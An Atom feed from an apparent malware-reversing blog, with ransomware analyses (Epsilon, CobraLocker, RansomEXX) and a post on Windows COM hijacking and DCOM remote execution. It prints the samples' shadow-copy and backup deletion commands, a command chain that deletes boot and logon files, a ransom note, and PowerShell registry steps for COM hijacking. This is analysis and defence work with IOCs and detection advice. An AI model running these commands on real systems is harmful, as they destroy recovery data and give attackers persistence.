<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://blog.reversing.xyz/feed.xml" rel="self" type="application/atom+xml" /><link href="http://blog.reversing.xyz/" rel="alternate" type="text/html" /><updated>2021-02-22T14:54:20+00:00</updated><id>http://blog.reversing.xyz/feed.xml</id><title type="html">blog.reversing.xyz</title><subtitle></subtitle><author><name>foo</name></author><entry><title type="html">Epsilon ransomware</title><link href="http://blog.reversing.xyz/epsilon.html" rel="alternate" type="text/html" title="Epsilon ransomware" /><published>2021-01-28T00:00:00+00:00</published><updated>2021-01-28T00:00:00+00:00</updated><id>http://blog.reversing.xyz/epsilon</id><content type="html" xml:base="http://blog.reversing.xyz/epsilon.html">&lt;p&gt;This ransomware is written in .NET and uses AES in CBC followed by RC4 to encrypt the files meaning it will encrypt the files twice.&lt;/p&gt;

&lt;p&gt;It starts by setting up persistence using a run key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/epsilon/img-persistence.PNG&quot; alt=&quot;persistence&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next it starts the encryption of files using AES and RC4:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/epsilon/img-encrypt.PNG&quot; alt=&quot;encrypt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ransomware targets the following drives:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:, D:, E:, F:, G:, Z:, A:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And encrypts files with the following extensions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.txt, .doc, .docx, .xls, .index, .pdf, .zip, .rar, .css, .lnk, .xlsx, .ppt, .pptx, .odt, .jpg, .bmp, .png, .csv, .sql, .mdb, .sln, .php, .asp, .aspx, .html, .xml, .psd, .bk, .bat, .mp3, .mp4, .wav, .wma, .avi, .divx, .mkv, .mpeg, .wmv, .mov, .ogg, .rtf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The encrypted files are given the following extension:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.[neftet@tutanota.com].boom
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The keys used for AES and RC4 are generated by a function that is very similar to the CobraLocker key generation function (that I posted before &lt;a href=&quot;http://blog.reversing.xyz/cobralocker.html&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/epsilon/img-passgen.PNG&quot; alt=&quot;passgen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the file encryption, the ransomware downloads to the startup folder a BMP image from the following discord cdn link:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hxxps://cdn.discordapp.com/attachments/599226424695455755/800087465523675176/65QEF.bmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The ransomnote also comes from discord cdn in the form of an HTA file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hxxps://cdn.discordapp.com/attachments/599226424695455755/798932401216552974/READ_ME.hta
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Saving the HTA file to the startup folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/epsilon/img-ransomnote.PNG&quot; alt=&quot;ransomnote&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ransomnote displayed via mshta.exe:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;C:\Windows\SysWOW64\mshta.exe&quot; &quot;C:\Users\Admin\Desktop\READ_ME.hta&quot; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/epsilon/image-20210128111620299.png&quot; alt=&quot;note&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To finish the ransomware deletes the Windows recovery files using the following commands:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cmd.exe /C vssadmin.exe delete shadows /all /quiet
cmd.exe /C wmic shadowcopy delete
cmd.exe /C wbadmin delete catalog -quiet
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;iocs&quot;&gt;IOCs&lt;/h1&gt;

&lt;p&gt;SHA256&lt;/p&gt;

&lt;p&gt;6b2affdfb3fe673b22ba6108fc78986ffea8167c5f3a80834e48378659d0ea83&lt;/p&gt;

&lt;p&gt;Email&lt;/p&gt;

&lt;p&gt;EpsilonCrypt@tutanota[.]com&lt;/p&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">This ransomware is written in .NET and uses AES in CBC followed by RC4 to encrypt the files meaning it will encrypt the files twice. It starts by setting up persistence using a run key: Next it starts the encryption of files using AES and RC4: The ransomware targets the following drives: C:, D:, E:, F:, G:, Z:, A: And encrypts files with the following extensions: .txt, .doc, .docx, .xls, .index, .pdf, .zip, .rar, .css, .lnk, .xlsx, .ppt, .pptx, .odt, .jpg, .bmp, .png, .csv, .sql, .mdb, .sln, .php, .asp, .aspx, .html, .xml, .psd, .bk, .bat, .mp3, .mp4, .wav, .wma, .avi, .divx, .mkv, .mpeg, .wmv, .mov, .ogg, .rtf The encrypted files are given the following extension: .[neftet@tutanota.com].boom The keys used for AES and RC4 are generated by a function that is very similar to the CobraLocker key generation function (that I posted before here). After the file encryption, the ransomware downloads to the startup folder a BMP image from the following discord cdn link: hxxps://cdn.discordapp.com/attachments/599226424695455755/800087465523675176/65QEF.bmp The ransomnote also comes from discord cdn in the form of an HTA file: hxxps://cdn.discordapp.com/attachments/599226424695455755/798932401216552974/READ_ME.hta Saving the HTA file to the startup folder: Ransomnote displayed via mshta.exe: &quot;C:\Windows\SysWOW64\mshta.exe&quot; &quot;C:\Users\Admin\Desktop\READ_ME.hta&quot; To finish the ransomware deletes the Windows recovery files using the following commands: cmd.exe /C vssadmin.exe delete shadows /all /quiet cmd.exe /C wmic shadowcopy delete cmd.exe /C wbadmin delete catalog -quiet IOCs SHA256 6b2affdfb3fe673b22ba6108fc78986ffea8167c5f3a80834e48378659d0ea83 Email EpsilonCrypt@tutanota[.]com</summary></entry><entry><title type="html">CobraLocker ransomware</title><link href="http://blog.reversing.xyz/cobralocker.html" rel="alternate" type="text/html" title="CobraLocker ransomware" /><published>2021-01-24T00:00:00+00:00</published><updated>2021-01-24T00:00:00+00:00</updated><id>http://blog.reversing.xyz/cobralocker</id><content type="html" xml:base="http://blog.reversing.xyz/cobralocker.html">&lt;p&gt;This is a .NET ransomware that encrypts the files using AES 256 in CBC mode using as key the SHA256 hash of a random password generated during runtime.&lt;/p&gt;

&lt;p&gt;This ransomware targets all files under the following locations:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\\Users\\&amp;lt;USERNAME&amp;gt;\\Desktop
C:\\Users\\&amp;lt;USERNAME&amp;gt;\\Downloads
C:\\Users\\&amp;lt;USERNAME&amp;gt;\\Documents
C:\\Users\\&amp;lt;USERNAME&amp;gt;\\Pictures
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Password geration function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/cobralocker/passgen.PNG&quot; alt=&quot;passgen&quot; /&gt;
As seen, the ransomware creates a password with a length of 999:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/cobralocker/passcreation.PNG&quot; alt=&quot;passcreation&quot; /&gt;&lt;/p&gt;

&lt;p&gt;File encryption using the SHA256 of the generated password as the AES key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/cobralocker/crypt.PNG&quot; alt=&quot;crypt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After encrypting the files the following ransomnote is written to **C:\Users\&lt;USERNAME&gt;\\Desktop\\readme.txt**:&lt;/USERNAME&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ooops! All your important files are encrypted!

All you important files are encrypted with AES 256 algoritm. No one can help you to restore files without our special decryptor.
All repair tools are useless.
If you want to restore some your files for free write to email and attach 2-3 encrypted files 
(non-archived and your files should not contain valuable information like databases, backups, large excel sheets etc.)
You have to pay $300 in bitcoin to decrypt other files.
As soon as we get bitcoins you'll get all your decrypted data back.

P.S.
Remember we are not scammers

Contact:
1.Download tor browser (https://www.torproject.org/)
2.Create account on mail2tor (http://mail2tor2zyjdctd.onion/)
3.Write e-mail to us (CobraLocker@mail2tor.com)

That's all
Good luck and have fun
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The ransomware will check the running processes and look for the following:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cmd
regedit
Processhacker
sdclt
powershell
processhacker
Processhacker2
gpedit
gpedit.msc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If it finds any of the processes it will hide its window.&lt;/p&gt;

&lt;p&gt;The ransomware executes the following command which deletes &lt;strong&gt;C:\bootmgr&lt;/strong&gt; and &lt;strong&gt;C:\Windows\System32\LogonUI.exe&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cmd.exe /k takeown /f C:\\bootmgr &amp;amp;&amp;amp; icacls C:\\bootmgr /grant %username%:F &amp;amp;&amp;amp; del C:\\bootmgr &amp;amp;&amp;amp; takeown /f C:\\Windows\\System32\\LogonUI.exe &amp;amp;&amp;amp; icacls C:\\Windows\\System32\\LogonUI.exe &amp;amp;&amp;amp; del C:\\Windows\\System32\\LogonUI.exe &amp;amp;&amp;amp; exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I made a quick PoC of the password generation function and I wonder how they will decrypt the files with the “special decryptor” lol.
&lt;img src=&quot;/assets/images/malware_analysis/cobralocker/poc.PNG&quot; alt=&quot;poc&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;iocs&quot;&gt;IOCs&lt;/h1&gt;
&lt;p&gt;file hash:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;6a85ff1bbaf1db330fb4e737074ca8f3dbd7ff4a4897a0af26e56751ad8c9cff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">This is a .NET ransomware that encrypts the files using AES 256 in CBC mode using as key the SHA256 hash of a random password generated during runtime. This ransomware targets all files under the following locations: C:\\Users\\&amp;lt;USERNAME&amp;gt;\\Desktop C:\\Users\\&amp;lt;USERNAME&amp;gt;\\Downloads C:\\Users\\&amp;lt;USERNAME&amp;gt;\\Documents C:\\Users\\&amp;lt;USERNAME&amp;gt;\\Pictures Password geration function: As seen, the ransomware creates a password with a length of 999: File encryption using the SHA256 of the generated password as the AES key: After encrypting the files the following ransomnote is written to **C:\Users\\\Desktop\\readme.txt**: Ooops! All your important files are encrypted! All you important files are encrypted with AES 256 algoritm. No one can help you to restore files without our special decryptor. All repair tools are useless. If you want to restore some your files for free write to email and attach 2-3 encrypted files (non-archived and your files should not contain valuable information like databases, backups, large excel sheets etc.) You have to pay $300 in bitcoin to decrypt other files. As soon as we get bitcoins you'll get all your decrypted data back. P.S. Remember we are not scammers Contact: 1.Download tor browser (https://www.torproject.org/) 2.Create account on mail2tor (http://mail2tor2zyjdctd.onion/) 3.Write e-mail to us (CobraLocker@mail2tor.com) That's all Good luck and have fun The ransomware will check the running processes and look for the following: cmd regedit Processhacker sdclt powershell processhacker Processhacker2 gpedit gpedit.msc If it finds any of the processes it will hide its window. The ransomware executes the following command which deletes C:\bootmgr and C:\Windows\System32\LogonUI.exe: cmd.exe /k takeown /f C:\\bootmgr &amp;amp;&amp;amp; icacls C:\\bootmgr /grant %username%:F &amp;amp;&amp;amp; del C:\\bootmgr &amp;amp;&amp;amp; takeown /f C:\\Windows\\System32\\LogonUI.exe &amp;amp;&amp;amp; icacls C:\\Windows\\System32\\LogonUI.exe &amp;amp;&amp;amp; del C:\\Windows\\System32\\LogonUI.exe &amp;amp;&amp;amp; exit I made a quick PoC of the password generation function and I wonder how they will decrypt the files with the “special decryptor” lol. IOCs file hash: 6a85ff1bbaf1db330fb4e737074ca8f3dbd7ff4a4897a0af26e56751ad8c9cff</summary></entry><entry><title type="html">Windows Component Object Model - Some thoughts</title><link href="http://blog.reversing.xyz/windows-com.html" rel="alternate" type="text/html" title="Windows Component Object Model - Some thoughts" /><published>2021-01-16T00:00:00+00:00</published><updated>2021-01-16T00:00:00+00:00</updated><id>http://blog.reversing.xyz/windows_com</id><content type="html" xml:base="http://blog.reversing.xyz/windows-com.html">&lt;p&gt;Windows COM is an interesting area to explore and I decided to put this blog post together as a method of “self-study” to understand it a bit better. Since I am mostly interested in malware reversing and offensive tradecraft it is nice to have at least a general idea of how it works and how it can be abused.&lt;/p&gt;

&lt;p&gt;In the first section I try to explain briefly what is COM, in the second section I show an example of a malware sample that uses a COM object to connect to an URL, the third section is about a technique known as COM hijacking and the final section is about using DCOM (Distributed Component Object Model) to achieve remote code execution.&lt;/p&gt;

&lt;h1 id=&quot;com&quot;&gt;COM&lt;/h1&gt;

&lt;p&gt;COM refers to “Component Object Model” and it is a mechanism used by the Windows operating system to allow different applications to use the components of each other without knowing their internals. This way, two different applications, written in two different languages are able to communicate with each other.&lt;/p&gt;

&lt;p&gt;COM is implemented as a client/server framework. The clients are the applications that are using the COM objects and the servers are the applications that are exposing their functionality through COM (the COM objects themselves).&lt;/p&gt;

&lt;p&gt;COM defines interfaces and applications that want to expose some of their functionalities through COM must implement them accordingly.  A COM object is defined by a CLSID (Class ID) which is nothing more than a GUID (Global Unique Identifier).&lt;/p&gt;

&lt;p&gt;Each object exposes functionality by implementing one or more interfaces, which are defined via IIDs (Interface IDs) that are also GUIDs.&lt;/p&gt;

&lt;p&gt;The classes are defined in the registry under the &lt;strong&gt;HKEY_CLASSES_ROOT\CLSID&lt;/strong&gt; and the interfaces are under &lt;strong&gt;HKEY_CLASSES_ROOT\Interface&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Classes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/classes.png&quot; alt=&quot;classes&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interfaces:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/interfaces.png&quot; alt=&quot;interfaces&quot; /&gt;&lt;/p&gt;

&lt;p&gt;(There is also registration free COM that uses XML files to register COM objects instead of the windows registry.)&lt;/p&gt;

&lt;p&gt;If you expand a random CLSID key you will see something similar to the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/inprocserver.png&quot; alt=&quot;inprocserver&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see a key named InprocServer32 under the CLSID. This means that this COM object is implemented by a DLL.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/inprocserver2.png&quot; alt=&quot;inprocserver2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You may also find some CLSIDs that have a sub-key named LocalServer32 instead of InprocServer32, which means that the COM object is implemented by an EXE file.&lt;/p&gt;

&lt;p&gt;In the values inside of InprocServer32 key you will find a path to the DLL:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/inprocserver3.png&quot; alt=&quot;inprocserver3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And a value named ThreadingModel:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/inprocserver4.png&quot; alt=&quot;inprocserver4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The value ThreadingModel can contain the following data:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Data&lt;/th&gt;
      &lt;th&gt;Meaning&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Apartment&lt;/td&gt;
      &lt;td&gt;Single Thread&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Free&lt;/td&gt;
      &lt;td&gt;Multi Thread&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Both&lt;/td&gt;
      &lt;td&gt;Single or Multi Thread&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Neutral&lt;/td&gt;
      &lt;td&gt;Thread Neutral&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;malware-using-com&quot;&gt;Malware using COM&lt;/h1&gt;

&lt;p&gt;It is common to find malware that uses COM objects to somehow masquerade their true intentions and make analysis harder.&lt;/p&gt;

&lt;p&gt;Calls to &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/ole2/nf-ole2-oleinitialize&quot;&gt;OleInitialize&lt;/a&gt;, &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializeex&quot;&gt;CoInitializeEx&lt;/a&gt; are good indicators that a malware will use COM objects.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/oleinitialize.png&quot; alt=&quot;oleinitialize&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A call to &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance&quot;&gt;CoCreateInstance&lt;/a&gt; with a CLSID and an IID being passed as arguments is used to initiate an instance of a COM object:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/cocreateinstance.png&quot; alt=&quot;cocreateinstance&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you take a look at the registry key and look for the CLSID you will find that it belongs to Internet Explorer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/clsid.png&quot; alt=&quot;clsid&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you do the same but for the IID you will see that it refers to the IWebBrowser2 interface:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/iid.png&quot; alt=&quot;iid&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This means that this malware is requesting access to a COM object (from Internet Explorer) that implements the IWebBrowser2 interface.&lt;/p&gt;

&lt;p&gt;Later the malware calls the IWebBrowser2.Navigate() function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/navigate.png&quot; alt=&quot;navigate&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you check the MSDN documentation for the &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa752127(v=vs.85)&quot;&gt;IWebBrowser2&lt;/a&gt; interface, you will see the full list of methods provided by the interface and the meaning of the Navigate method:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/navigatemsdn.png&quot; alt=&quot;navigatemsdn&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As seen, in this example the Navigate function allows the malware to use Internet Explorer to access an URL.&lt;/p&gt;

&lt;h1 id=&quot;com-hijacking&quot;&gt;COM Hijacking&lt;/h1&gt;

&lt;p&gt;When it comes to abuse COM, there is a technique known as COM Hijacking. The goal of this method is to replace the path inside the registry entry so that it points to a different DLL, one that is controlled by yourself. This can be used for purposes such as persistence and even privilege escalation.&lt;/p&gt;

&lt;p&gt;However, this technique can be dangerous depending on the COM object that you try to hijack, because this method can break the functionality of an application.&lt;/p&gt;

&lt;p&gt;One thing that is important to know in order to understand this technique is that COM objects are defined in two locations inside the registry key.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Description&lt;/th&gt;
      &lt;th&gt;Registry Location&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Machine wide COM objects&lt;/td&gt;
      &lt;td&gt;HKLM\SOFTWARE\CLASSES\CLSID&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;User COM objects&lt;/td&gt;
      &lt;td&gt;HKCU\SOFTWARE\CLASSES\CLSID&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;These to locations are then merged and build the already known location: &lt;strong&gt;HKEY_CLASSES_ROOT\CLSID&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Why does this matter? Well, a regular user &lt;strong&gt;can define&lt;/strong&gt; COM objects on the HKCU and even &lt;strong&gt;duplicate&lt;/strong&gt; the ones in HKLM. This is interesting because when it comes to execution the HKCU definitions &lt;strong&gt;take precedence&lt;/strong&gt; over HKLM, thus giving the opportunity to hijack what will be executed.&lt;/p&gt;

&lt;p&gt;Like I mentioned before, COM hijacking is dangerous as it can break functionality of applications… So a common practice is to look for applications trying to access COM objects that &lt;strong&gt;don’t exist&lt;/strong&gt; and hijack those.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/notfound.png&quot; alt=&quot;notfound&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also you better choose one CLSID that is not accessed to often, otherwise your payload will execute to many times…&lt;/p&gt;

&lt;p&gt;For this example I created a simple DLL that when loaded into a process memory creates a message box with some text.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/dll.png&quot; alt=&quot;dll&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now all you need to do is to target a CLSID and define it in the registry. The following PowerShell commands registers the targeted COM object inside the HKCU:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;New-Item -Path &quot;HKCU:Software\Classes\CLSID&quot; -Name &quot;{660b90c8-73a9-4b58-8cae-355b7f55341b}&quot;

New-Item -Path &quot;HKCU:Software\Classes\CLSID\{660b90c8-73a9-4b58-8cae-355b7f55341b}&quot; -Name &quot;InprocServer32&quot; -Value &quot;C:\Users\IEUser\Desktop\comhijack.dll&quot;

New-ItemProperty -Path &quot;HKCU:Software\Classes\CLSID\{660b90c8-73a9-4b58-8cae-355b7f55341b}\InprocServer32&quot; -Name &quot;ThreadingModel&quot; -Value &quot;Both&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After some random time, the following message box appears:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/hijack.png&quot; alt=&quot;hijack&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This means that the previously inexistent COM object was successfully hijacked with my custom DLL.&lt;/p&gt;

&lt;h1 id=&quot;dcom---remote-code-execution&quot;&gt;DCOM - Remote Code Execution&lt;/h1&gt;

&lt;p&gt;DCOM refers to “Distributed Component Object Model” which extends Microsoft’s COM and allows the communication between software components over a network through COM.&lt;/p&gt;

&lt;p&gt;There are many applications that export some of their functionality through DCOM. To get a list of applications that use DCOM we can run the following PowerShell command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-CimInstance Win32_DCOMApplication
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You should see something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/dcomapps.png&quot; alt=&quot;dcomapps&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this example I use the MMC Application Class (MMC20.Application) since it provides a way of executing remote commands on a computer. (Note: The usage of the MMC Application Class for remote execution was not discovered by myself. In &lt;a href=&quot;https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/&quot;&gt;&lt;strong&gt;this&lt;/strong&gt;&lt;/a&gt; blogpost you can find the research of enigma0x3 about this topic.)&lt;/p&gt;

&lt;p&gt;If you open an instance of the MMC Application Class object and search for the methods under Document.ActiveView you will see a method named &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand?redirectedfrom=MSDN&quot;&gt;&lt;strong&gt;ExecuteShellCommand&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/mmc.png&quot; alt=&quot;mmc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This method will allow a user with administrator privileges to execute a command through DCOM on a remote computer.&lt;/p&gt;

&lt;p&gt;As seen below my user which is logged at DC1 is admin on WINSRV16:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/admin.png&quot; alt=&quot;admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All I need to do now is to open an instance of the MMC20.Application object while specifying the hostname of the target:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/activator.png&quot; alt=&quot;activator&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And finally call ExecuteShellCommand method to trigger the remote code execution:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/remoteexec.png&quot; alt=&quot;remoteexec&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On WINSRV16 where I am logged in as the user jamess there is now running a win32calc.exe process that belongs to the user Administrator:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/tasklist.png&quot; alt=&quot;tasklist&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/processes.png&quot; alt=&quot;processes&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As seen, DCOM can be used for remote code execution, thus it provides another way of moving laterally through a network.&lt;/p&gt;

&lt;p&gt;To detect this specific way of using MMC Application Class through DCOM to trigger remote code execution defenders can look for child processes of mmc.exe.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/windows_com/childprocess2.png&quot; alt=&quot;childprocess&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you read this I hope you enjoyed it and if I made any mistake let me know :)&lt;/p&gt;

&lt;p&gt;Cheers!&lt;/p&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">Windows COM is an interesting area to explore and I decided to put this blog post together as a method of “self-study” to understand it a bit better. Since I am mostly interested in malware reversing and offensive tradecraft it is nice to have at least a general idea of how it works and how it can be abused.</summary></entry><entry><title type="html">RansomEXX Linux</title><link href="http://blog.reversing.xyz/ransomexx-linux.html" rel="alternate" type="text/html" title="RansomEXX Linux" /><published>2021-01-05T00:00:00+00:00</published><updated>2021-01-05T00:00:00+00:00</updated><id>http://blog.reversing.xyz/ransomexx_linux</id><content type="html" xml:base="http://blog.reversing.xyz/ransomexx-linux.html">&lt;p&gt;In this blog point I will go through a Linux sample of the ransomware family RansomEXX (aka Defray777). This ransomware group did some big attacks during 2020 and only Windows samples were known until &lt;a href=&quot;https://securelist.com/ransomexx-trojan-attacks-linux-systems/99279/&quot;&gt;Kaspersky&lt;/a&gt; revealed that the group also had a Linux build.&lt;/p&gt;

&lt;h1 id=&quot;reversing&quot;&gt;Reversing&lt;/h1&gt;
&lt;p&gt;This ransomware uses AES in ECB mode with a 256 bit key for file encryption and RSA to encrypt the AES key used for file encryption. The encrypted key is then added as a blob of metadata to every encrypted file. This way the group guarantees that only them can recover the AES key used to encrypt the each file.&lt;/p&gt;

&lt;p&gt;For encryption the ransomware uses a library named &lt;a href=&quot;https://tls.mbed.org&quot;&gt;mbedtls&lt;/a&gt; and it also implements a nice logic for speeding the encryption as it uses threads with in memory “queues”.&lt;/p&gt;

